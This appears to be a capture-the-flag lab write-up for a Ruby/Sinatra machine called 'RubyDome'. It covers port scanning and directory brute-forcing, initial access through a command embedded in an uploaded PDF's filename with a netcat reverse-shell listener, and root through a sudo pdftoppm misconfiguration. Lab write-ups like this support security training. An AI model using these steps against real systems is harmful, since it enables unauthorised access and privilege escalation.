# RubyDome

> Ruby/Sinatra + pdftoppm / sudo pdftoppm

### Enumerating Services
First, we'll perform a generic scan to identify the open ports and services running on this machine.
```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.182.218

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu
3000/tcp open  http    WEBrick httpd 1.7.0 (Ruby 3.1.2)
```
### Enumerating port 3000
Ruby Sinatra web application that converts PDF to images using pdftoppm.
```shell
# Enum dir
feroxbuster -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -d 2 -x rb,html -C 404,502 -u http://192.168.182.218:3000
```
### Initial Access
The application accepts PDF uploads. Used a malicious PDF to trigger command execution.
```shell
# Listener
rlwrap -cAra nc -vnlp 443

# Upload PDF with embedded command in filename
# TTY Upgrade
/usr/bin/python3 -c "import pty;pty.spawn('/bin/bash')"

# Evidence
cat /home/andrew/local.txt
```
### Privilege Escalation
```shell
# Sudo check
sudo -l
User andrew may run the following commands:
    (ALL) NOPASSWD: /usr/bin/pdftoppm

# GTFOBins: pdftoppm can write files as root
TF=$(mktemp -u)
sudo pdftoppm -singlefile -r 72 /path/to/file.pdf $TF
```
### Post-Exploitation
```shell
# Evidence
cat /root/proof.txt
```
